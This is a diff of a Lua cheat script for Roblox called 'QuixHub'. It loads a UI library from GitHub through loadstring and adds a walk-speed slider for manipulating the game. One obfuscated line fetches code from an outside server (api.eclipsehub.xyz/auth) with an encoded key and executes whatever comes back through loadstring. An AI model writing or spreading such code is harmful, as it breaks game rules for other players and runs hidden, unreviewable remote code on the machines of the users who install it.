@@ -1,6 +1,5 @@
--- made by goose you legends
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
-local Window = Library.CreateLib("Walk 50,000 studs for nothing. - QuixHub", "Ocean")
+local Window = Library.CreateLib("Universal - QuixHub", "Ocean")
 local Universal = Window:NewTab("Universal")
 local UniversalSection = Universal:NewSection("Universal")
 	UniversalSection:NewSlider("Walk Speed", "Will change your walkspeed.", 500, 1, function(s) -- 500 (MaxValue) | 0 (MinValue)
@@ -51,5 +50,4 @@ local UniversalSection = Universal:NewSection("Universal")
 		getgenv().mainKey = "nil"
 
 		local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https://api.eclipsehub.xyz/auth"c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
-	end)
-end
+end)
